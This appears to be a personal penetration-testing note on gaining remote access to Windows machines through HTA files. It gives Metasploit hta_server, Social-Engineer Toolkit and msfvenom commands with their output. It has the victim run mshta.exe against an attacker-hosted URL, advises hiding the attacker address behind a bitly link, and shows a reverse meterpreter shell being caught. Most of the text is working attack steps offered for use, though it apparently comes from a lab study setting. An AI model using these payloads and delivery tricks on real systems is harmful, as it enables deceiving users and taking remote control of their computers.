# Pre-requisite - [[HTA Info]]
## Using Metasploit 
- This module hosts an HTML Application (HTA) that when opened will run a payload via powershell.
- When a user navigates to the HTA file they will be prompted by IE twice before the payload is executed.
```python
msf6 exploit(windows/misc/hta_server) > set SRVHOST 192.168.1.7
SRVHOST => 192.168.1.7
msf6 exploit(windows/misc/hta_server) > set URIPATH form
URIPATH => form
msf6 exploit(windows/misc/hta_server) > set LHOST 192.168.1.7
LHOST => 192.168.1.7
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
```
**Result** - 
![[HTA_server_started.png]]
- Once the exploit is executed, it will give you an URL link with the extension of .hta.
- Simultaneously, Metasploit will start the server which allows you to share the file.
- Use the below command in your victim PC in order to download the .hta file.
```python
mshta.exe http://192.168.1.7:8080/form
```
- When hta gets launched by mshta.exe it uses a signed Microsoft binary, allowing you to call PowerShell and inject a payload directly into memory.
![[WhatsApp Image 2023-04-22 at 1.27.07 PM.jpeg]]

## Using Setoolkit
- First option by **typing 1** to access social engineering tools.
![[social_engineering_hta_step1.png]]

- Choose second option by **typing 2**.
![[social_engineering_hta_step2.png]]

- Choose **option 7** to select the HTA attack method.
![[social_engineering_hta_step3.png]]

- For cloning the site you need to select the **option 2**. After that it will ask for url of site to clone.
- we have given www.ignitetechnologies.in.
- And then select the required port to listen on.
- After that select the payload you want to deliver
  ![[social_engineering_hta_step4.png]]
  - At the end convert your machine ip address to legitemate link using "bitly" website(https://bitly.com/pages/home/v2)
  - send the link to your target machine and then you get a session of meterpreter.
  - The above social engineering method is not reliable.

## Using magic unicorn
- It's not working.

## Using MSFVenom
- We manually creating a .hta file through msfvenom.
- Type the following command
```python
┌──(hyok㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.7 lport=1234 -f hta-psh > shell.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of hta-psh file: 7471 bytes
```
- After creating the .hta file, turn on the python server to share the file to the victim's PC by typing:
```python
┌──(hyok㉿kali)-[~/msfvenom_stuffs]
└─$ python3 -m http.server --bind 0.0.0.0 80      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
- Running the .hta file on victim's computer by typing the below command:
![[msfvenom_hta_attack.jpeg]]
- Simultaneously, start your handler to receive a session when you run the above file in the victim's cmd prompt.
```python
msf6 > use exploit/multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.7
LHOST => 192.168.1.7
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.7:1234 
```
- And then, when the file running on victim computer then you get a session.
```python
[*] Sending stage (175686 bytes) to 192.168.1.2
[*] Meterpreter session 1 opened (192.168.1.7:1234 -> 192.168.1.2:60992) at 2023-04-25 12:35:14 +0530
```

## Using Cactustorch
It's not working.

